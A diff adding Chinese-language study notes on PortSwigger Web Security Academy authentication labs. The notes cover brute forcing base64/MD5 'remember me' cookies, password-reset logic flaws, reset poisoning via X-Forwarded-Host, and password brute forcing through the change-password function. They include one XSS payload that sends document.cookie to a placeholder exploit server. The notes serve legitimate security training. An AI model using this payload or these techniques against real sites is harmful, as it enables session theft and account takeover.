@@ -1,0 +1,33 @@
+### 记住我 ###
+https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie
+# 记住我功能的cookie包含敏感信息，且简单编码 #
+@ 记住我功能将额外产生一个cookie，由base64编码，解码后由"用户名:字符串"格式构成。
+字符串匹配密码的MD5散列，在攻击器中设置各层格式爆破cookie @
+
+https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking
+@@ 使用XSS获得cookie：
+<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
+得到的字符串使用base64解码，取其中密码字符串使用MD5爆破工具得到密码
+@@
+
+### 重置密码 ###
+https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic
+# 重置密码令牌缺乏上下文，使用返回到客户端的信息确认状态 #
+发送到邮箱的重置密码令牌缺乏上下文，且使用客户端隐藏表单保存当前重置用户，导致可重置其他用户密码
+@ 根据解决方案，甚至删除密码重置令牌仍可使用重置密码功能@
+使用重置密码功能时邮箱得到一个令牌，点击重置url填写新密码后，提交时使用此令牌并且提交隐藏表单的用户名，
+修改用户名到目标用户即可重置其密码
+
+https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware
+# 头部注入 #
+@@ 在动态生成url时，在密码重置数据包头部，使用X-Forwarded-Host伪装攻击者控制的服务器为原始服务器。
+此时，站点服务器发送的重置邮件中，重置url的host从站点服务器替换为攻击者服务器 @@
+
+### 更改密码 ###
+https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change
+# cookie缺乏上下文，非通用错误信息。#
+cookie缺乏上下文，虽然删除cookie后无法进行操作，但登录用户的cookie能够对其他用户进行密码修改。
+修改密码时的响应有差异 
+@@ 修改密码时，若密码错误同时两个新密码相同则锁定；若密码错误的同时两个新密码不匹配则提示密码输入错误。
+由此进行密码爆破 @@
+应当对各种组合进行测试
